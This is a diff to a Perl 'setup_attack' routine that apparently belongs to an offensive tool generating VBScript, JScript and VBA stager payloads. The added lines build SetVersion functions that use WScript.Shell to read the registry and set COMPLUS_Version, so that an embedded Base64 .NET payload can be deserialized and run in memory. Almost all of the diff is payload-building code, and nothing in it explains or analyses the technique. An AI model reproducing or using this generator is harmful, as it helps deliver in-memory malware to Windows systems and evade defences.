@@ -43,6 +43,17 @@ sub setup_attack {
 		$data = $data . "Sub Debug(s)\r\n";
 		$data = $data . "End Sub\r\n";
 		$data = $data . "Sub SetVersion\r\n";
+		$data = $data . "Dim shell\r\n";
+		$data = $data . "Set shell = CreateObject(\"WScript.Shell\")\r\n";
+		$data = $data . "Dim ver\r\n";
+		$data = $data . "ver = \"v4.0.30319\"\r\n";
+		$data = $data . "On Error Resume Next\r\n";
+		$data = $data . "shell.RegRead \"HKLM\\SOFTWARE\\\\Microsoft\\.NETFramework\\v4.0.30319\\\"\r\n";
+		$data = $data . "If Err.Number <> 0 Then\r\n";
+		$data = $data . "  ver = \"v2.0.50727\"\r\n";
+		$data = $data . "  Err.Clear\r\n";
+		$data = $data . "End If\r\n";
+		$data = $data . "shell.Environment(\"Process\").Item(\"COMPLUS_Version\") = ver\r\n";
 		$data = $data . "End Sub\r\n";
 		$data = $data . "Function Base64ToStream(b)\r\n";
 		$data = $data . "  Dim enc, length, ba, transform, ms\r\n";
@@ -243,6 +254,14 @@ sub setup_attack {
 		# variables set at this point
 
 		$data = $data . "function setversion() {\r\n";
+		$data = $data . "var shell = new ActiveXObject('WScript.Shell');\r\n";
+		$data = $data . "ver = 'v4.0.30319';\r\n";
+		$data = $data . "try {\r\n";
+		$data = $data . "shell.RegRead('HKLM\\\\SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\v4.0.30319\\\\');\r\n";
+		$data = $data . "} catch(e) { \r\n";
+		$data = $data . "ver = 'v2.0.50727';\r\n";
+		$data = $data . "}\r\n";
+		$data = $data . "shell.Environment('Process')('COMPLUS_Version') = ver;\r\n";
 		$data = $data . "}\r\n";
 		$data = $data . "function debug(s) {}\r\n";
 		$data = $data . "function base64ToStream(b) {\r\n";
@@ -447,6 +466,20 @@ sub setup_attack {
 		}
 
 		#$data = $insert;
+
+		$data = $data . "Sub SetVersion\r\n";
+		$data = $data . "Dim shell\r\n";
+		$data = $data . "Set shell = CreateObject(\\"WScript.Shell\\")\r\n";
+		$data = $data . "Dim ver\r\n";
+		$data = $data . "ver = \\"v4.0.30319\\"\r\n";
+		$data = $data . "On Error Resume Next\r\n";
+		$data = $data . "shell.RegRead \\"HKLM\\SOFTWARE\\\\Microsoft\\.NETFramework\\v4.0.30319\\\\"\r\n";
+		$data = $data . "If Err.Number <> 0 Then\r\n";
+		$data = $data . "  ver = \\"v2.0.50727\\"\r\n";
+		$data = $data . "  Err.Clear\r\n";
+		$data = $data . "End If\r\n";
+		$data = $data . "shell.Environment(\\"Process\\").Item(\\"COMPLUS_Version\\") = ver\r\n";
+		$data = $data . "End Sub\r\n";
 
 		$data = $data . "Public binary As String\r\n";
 		$data = $data . "Public code As String\r\n";
